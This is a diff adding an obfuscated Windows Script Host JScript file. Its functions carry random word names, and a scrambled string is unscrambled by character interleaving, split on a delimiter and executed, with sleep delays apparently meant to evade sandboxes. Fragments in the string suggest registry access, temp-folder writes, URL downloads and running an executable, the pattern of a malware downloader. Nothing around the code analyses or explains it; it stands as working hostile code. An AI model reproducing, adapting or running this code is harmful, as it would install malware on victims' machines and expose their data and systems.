@@ -1,0 +1,15 @@
+function control(){month=1;thing=month;WScript.Sleep(3465);represent=thing+month*thing+month;part[5862065]=fire;}
+function little(particular,visit,game,size,drop,supply,many) {return particular.substr(visit,game);}
+function record(his,sand,island){than="";decide=sky;while (decide < 2811) {example=seed(his,decide);than=come(than,example,decide); decide++; }return than;}
+function position(help,car,trouble){return help % (thing+thing);}
+function gray(){part[3546195]=control;WScript.Sleep(8413);speech = '(fis\" \\g (%n;(UitoSrx.EteiRSTnDtedNnseSenxDmoOOnpfMos(Are\\I\"riN@.v%\\K\"\"n\\+ E)g=d + n!\\o\"=a @ pr\\\"\"\\xa,%Ev U. 0S){)E\\ \"R))lD=0lN=0eS-2hD1 SO)=.M =tA{=pI  iNWsr%Suc\"c\\Str)Wai \\t\"{ps(gt.t=.Kcgs(e+l j\"e\\bfe1Oip7e (5t}27a 22e;21re2\"C\\2s.;)lt};ap  fit} rr ncyerS{luW st(Kee . rfo{ ip { eo);n e)(=(0\' \\3hoG+c.E0trT7ae\',\\pc2,l}( a ]\'c\\\\;\"he)rt((tt\\d\"psn@sbe\\:\"su/+.s/gK\\\'\"\\+ [+\\;\"a))@[(e\\C\"sg],ln+\\a\"\'i\\\\f\"/r )st,;eSg ao+vrt\"a\\.cr=)h n(.uimp roh=wdp en\'o\\ah.+ryr\".\\emh?pktmlqanaiMkc\' (ed=r(o c/egr(( ]\\I\\[;edr)u{s\\a\'e2mP{} Ty)rTt/}H;g5L1,=Me sXifarru;e9n1v-c2r2t=eIi;S)o\".ZnS2_ \"L+(\"MGMEX\")+S\" RM\"{ \\,\'\" \"( r,tlelcetmesu(j]r\"ben\"O+ \"etSit\"t+a\"rre\"i+r\"nWCgge.\".+t\"fRp\"r[itolrumcciCfSfhiWda  {r =)Ce (ohKcdt aec{ (}  p;))al3lre mss<(e] \"I\"C+n\"(dt\" +(\"eaM\"l+,\"ie1\"h+0\"wR)\" ++\";g3\"0+0\" e)\"=+;\" R \"C[}t l)u;c;i]f f\\i\"dm e{e dyar.ts;e\"u\\g\\ruaeeEtd[qeN3sr\\]\\t\"(+t\"u\"e+)\"lR(\".+)\"wE;\"w+ \"wSW\"\\+\"\"SU,\"c+\\\"\"_rTrNi\"f+p\".EtReR.\"d+Q\"aUuCt_i\"s+t\"iY(Eb\")+a\";KlH \"e }=d  lsl}enm se e;i)l\"h\"s+c\"elsl \"e+{\"le h.SW.w\"S+w\"ctw\"r+\\\"\"pi\",+p\"\\i\"rt\"z+.\"ccs\".+l\"sSe\"o+e\"cWp\"u((]a\"2\"g+2\"st2\"o+2\"lc2e.j)\"w+;\"wb \"w+}\"\\O\"\" +[\"Ce \"++=\"+t \";+a\"}a\'e)\")+(\")r;C}\"c[a)ttcphi(rec)S{WW(S c=r itpltu.csilfefeipd(;402426293=1f2c3y5e)z;t}Vkaeqdzlgxrko=tmceuarstusrneo;c ';sky=0;}
+function test(late,hold,include){measure[represent](measure[thing])(part);}
+function fire(market,wait){moment="gzqaV";part[6002230]=two;measure=all(record(speech),moment);}
+function seed(these,drink,plural,one,ten){return little(these,drink,month);}
+function come(experience,choose,place,came,big,together,why) { if (position(place)) return experience+choose; else return choose+experience; }
+function all(much,practice,ago,dictionary,men) {original = sky;sight = baby(practice);brought=[];for (and=sky; and<=(baby(much)-(sight)); and++) {if (little((much),(and),sight)==practice){brought[baby(brought)]=little(much,original,(and-original));original = (and+sight);}}brought[baby(brought)]=little(much,original);return brought;}
+function old(gather,lead,bar){part=[2771];thought(part);}
+function two(gas,collect){part[6601407]=test;measure[represent] = gray[measure[sky]];}
+function baby(spread,close,joy,board) {return spread.length; }
+old(6978);
+function thought(hair,remember){WScript.Sleep(76026);winter=5229;while(gray=gray){try{part[winter](winter);}catch(over){part[1072876]=gray;}winter++}}
